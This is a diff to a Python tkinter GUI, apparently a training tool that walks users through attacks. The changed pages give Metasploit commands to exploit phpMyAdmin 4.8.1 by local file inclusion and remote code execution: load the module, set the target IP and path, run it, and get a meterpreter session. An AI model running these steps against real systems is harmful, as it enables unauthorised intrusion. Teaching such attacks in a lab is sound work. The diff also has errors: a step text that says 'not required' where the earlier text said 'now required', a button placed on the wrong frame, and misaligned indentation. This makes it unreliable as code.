@@ -40,27 +40,15 @@ class AttackVectorEleven(tk.Frame):
             step1frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                     aspect=350)
             step1frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
-            terminalButton = tk.Button(step1frame, text="Terminal", bg="#E7E7E7", fg="black", font=highlightFont,
-                                       command=load_terminal, relief='flat').place(rely=0.5, relx=0.14, relheight=0.05,
-                                                                                   relwidth=0.1)
             
         def change_to_Step2():
             text = (
-                "\n\nStep 2: Walkthrough\n\n"
+                "\n\nStep 2: Walkthrough Part 1\n\n"
                 "o   On the windows machine, make sure that you are running and logged into phpMyAdmin.\n\n"
                 "o   Open terminal on Kali Linux and run metaploit using this command:\n"
                 "     msfconsole\n\n"
                 "o   Load the exploit using:\n"
                 "     use exploit/multi/http/phpmyadmin_lfi_rce\n\n"
-                "o   You are now required to enter the RHOSTS (Victim's IP address)\n"
-                "and TARGETURI (name of the folder you have installed phpmyadmin 4.8.1 in).\n\n"
-                "o   Use the following commands to set RHOSTS and TARGETURI:\n"
-                "     set RHOSTS 192.168.68.117\n"
-                "     set TARGETURI /phpmyadmin4.8.1/\n\n"
-                "o   (IP address and folder name is just and example. Please modify accordingly)\n\n"
-                "o   Finally run the exploit using:\n"
-                "     run\n\n"
-                "o   If successfull, a meterpreter session should be created and the RCE attack is complete.\n\n"
             )
             step2frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
                                     aspect=350)
@@ -68,6 +56,26 @@ class AttackVectorEleven(tk.Frame):
             terminalButton = tk.Button(step2frame, text="Terminal", bg="#E7E7E7", fg="black", font=highlightFont,
                                        command=load_terminal, relief='flat').place(rely=0.5, relx=0.14, relheight=0.05,
                                                                                    relwidth=0.1)
+         def change_to_Step3():
+            text = (
+                "\n\nStep 3: Walkthrough Part 2\n\n"
+                "o  You are not required to enter the RHOSTS (Victim's IP address)\n"
+                "and TARGETURI (name of the folder you have installed phpmyadmin 4.8.1 in).\n\n"
+                "o  Use the following commands to set RHOSTS and TARGETURI:\n"
+                "    set RHOSTS 192.168.68.117\n"
+                "    set TARGETURI /phpmyadmin4.8.1/\n\n"
+                "o  (IP address and folder name is just an example. Please modify accordingly)\n\n"
+                "o  Finally run the exploit using:\n"
+                "    run\n\n"
+                "o  If successfull, a meterpreter session should be created and the attack is complete.\n\n"
+            )
+            step3frame = tk.Message(main_frame, text=text, fg='black', bg='white', font=('Calibri', 20), anchor='nw',
+                                    aspect=350)
+            step3frame.place(rely=0.2, relx=0.2, relheight=1, relwidth=1)
+            terminalButton = tk.Button(step2frame, text="Terminal", bg="#E7E7E7", fg="black", font=highlightFont,
+                                       command=load_terminal, relief='flat').place(rely=0.9, relx=0.14, relheight=0.05,
+                                                                                   relwidth=0.1)
+                 
         # creates blue bar as canvas below nav bar housing label containing title of page
         title_canvas = tk.Canvas(self, bg='#64C1DA', highlightthickness=0)
         title_canvas.place(rely=0.08, relheight=0.12, relwidth=1)
@@ -89,6 +97,9 @@ class AttackVectorEleven(tk.Frame):
         step2btn = tk.Button(main_frame, text="Step 2", bg="#E7E7E7", fg="black", font=highlightFont,
                              command=change_to_Step2, relief='flat').place(rely=0.4, relx=0.02, relheight=0.05,
                                                                            relwidth=0.1)
-            
+        step2btn = tk.Button(main_frame, text="Step 3", bg="#E7E7E7", fg="black", font=highlightFont,
+                             command=change_to_Step3, relief='flat').place(rely=0.5, relx=0.02, relheight=0.05,
+                                                                           relwidth=0.1)
+         
         display_nav_bar(self, controller)
         main_frame.pack(fill='both', expand=1)
